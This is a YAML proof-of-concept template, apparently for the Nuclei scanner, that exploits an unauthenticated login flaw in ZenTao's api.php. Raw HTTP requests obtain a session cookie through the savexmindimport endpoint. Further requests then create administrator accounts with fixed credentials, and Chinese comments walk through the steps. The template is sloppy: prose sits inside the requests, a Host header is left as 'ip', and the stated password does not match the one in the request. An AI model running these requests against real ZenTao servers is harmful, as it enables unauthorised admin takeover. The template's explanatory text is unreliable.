id: poc-tf8ne5g6qch110i8
info:
  name: 禅道api.php存在未授权登入漏洞
  author: hacktwo
  severity: medium
  description: ''
  tags: unauth,2025
http:
- raw:
  - 'GET /zentaopms/www/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1

    Host: {{Hostname}}


    Set-Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv;

    构造数据包，创建账户'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /zentaopms/www/api.php/v1/users HTTP/1.1

    Host:ip

    Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv; lang=zh-cn; device=desktop; theme=default


    {"account": "longl", "password": "Qwe123", "realname": "longl", "group":"1"}

    "group":"1"为管理员分组


    登入账号

    账号：longl

    密码：Qwest23


    **POC2:**'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=dddidkyodsnfamzvjidb&branch=klmnehgxnsmeuhshbooy HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0

    Accept: */*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate, br

    Connection: close

    发起的请求中如果携带了默认的cookie 需要删除再发送请求


    创建账号可以直接构造POC'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /zentao/api.php/v1/users HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0

    Accept: */*

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate, br

    Cookie: zentaosid=上一部获取的有效cookie;

    Connection: close

    Content-Length: 88


    {"account":"rootroot","password":"Qwe123","realname":"rootroot","role":"","group":"1"}


    然后即可成功登录。


    **POC3:**

    获取cookie'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
